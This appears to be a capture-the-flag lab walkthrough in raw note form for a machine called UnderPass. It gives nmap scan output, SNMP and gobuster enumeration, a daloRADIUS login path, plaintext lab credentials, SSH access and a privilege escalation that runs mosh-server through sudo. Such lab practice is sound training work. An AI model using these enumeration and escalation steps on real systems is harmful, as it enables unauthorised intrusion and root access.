@@ -1,0 +1,29 @@
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 48b0d2c72926ae3dfbb76b0ff54d2aea (ECDSA)
+|_  256 cb6164b81b1bb5bab84586c516bbe2a2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+
+PORT     STATE         SERVICE
+161/udp  open          snmp
+1812/udp open|filtered radius
+1813/udp open|filtered radacct
+
+
+snmpwalk -v 2c -c public 10.10.11.48 
+"steve@underpass.htb"
+UnDerPass.htb is the only daloradius server in the basin!"
+
+gobuster dir -u http://underpass.htb/daloradius -w /usr/share/wordlists/dirb/big.txt        
+
+http://underpass.htb/daloradius/app/operators/home-main.php
+-u svcMosh -p underwaterfriends      
+ssh svcMosh@10.10.11.48
+sudo -l
+mosh --server="sudo /usr/bin/mosh-server" localhost
+
+
+                  
